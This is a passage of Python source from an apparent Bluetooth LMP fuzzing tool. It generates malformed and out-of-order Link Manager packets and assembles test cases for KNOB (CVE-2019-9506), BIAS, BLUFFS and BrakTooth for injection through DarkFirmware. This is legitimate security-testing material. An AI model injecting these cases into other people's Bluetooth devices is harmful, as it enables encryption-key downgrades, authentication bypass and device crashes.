    yield ("truncated_ext_escape_only", [bytes([LMP_ESCAPE_4])])

    # Extended opcode with zero-length params
    yield ("ext_io_cap_truncated", [bytes([LMP_ESCAPE_4, EXT_IO_CAPABILITY_REQ])])

    # SSP confirm/number without IO capability exchange
    yield ("ssp_confirm_no_io", [
        build_simple_pairing_confirm(),
        build_simple_pairing_number(),
    ])

    # AFH manipulation during authentication
    yield ("afh_during_auth", [
        build_au_rand(),
        build_set_afh(afh_instant=0, afh_mode=1, afh_channel_map=b"\x00" * 10),
    ])

    # Test mode activation (should be rejected in normal operation)
    yield ("test_activate_normal", [build_lmp(LMP_TEST_ACTIVATE)])

    # Test control with all-zero params
    yield ("test_control_zero", [build_test_control()])


# ===========================================================================
# Master Generator
# ===========================================================================

def generate_all_lmp_fuzz_cases() -> list[tuple[str, bytes]]:
    """Generate a combined list of all LMP fuzz cases.

    Collects outputs from all fuzz generators into a single flat list.
    Each entry is a (label, raw_LMP_PDU) tuple suitable for injection
    via DarkFirmware's send_LMP_reply().

    Returns:
        List of (label, payload) tuples. Typical count: ~700-900 cases.
    """
    cases: list[tuple[str, bytes]] = []

    # Random params for all defined opcodes
    cases.extend(fuzz_all_opcodes())

    # KNOB key size sweep (CVE-2019-9506)
    cases.extend(fuzz_enc_key_size())

    # Feature bitmask variations
    cases.extend(fuzz_features())

    # Truncated PDUs
    cases.extend(fuzz_truncated())

    # Oversized PDUs
    cases.extend(fuzz_oversized())

    # Undefined opcodes
    cases.extend(fuzz_invalid_opcodes())

    # TID manipulation
    cases.extend(fuzz_invalid_tid())

    # IO capability sweep
    cases.extend(fuzz_io_capabilities())

    # Auth requirement sweep
    cases.extend(fuzz_auth_requirements())

    # CVE-specific sequences
    cases.append(("knob_template", knob_template()))
    cases.extend(bias_role_switch_sequence())
    cases.extend(bluffs_downgrade_sequence())

    # State confusion sequences (flattened: each packet becomes a separate case)
    for label, packets in fuzz_state_confusion():
        for i, pkt in enumerate(packets):
            cases.append((f"state_{label}_{i}", pkt))

    # BrakTooth-specific patterns
    for label, packets in fuzz_braktooth_patterns():
        for i, pkt in enumerate(packets):
            cases.append((f"braktooth_{label}_{i}", pkt))

    return cases
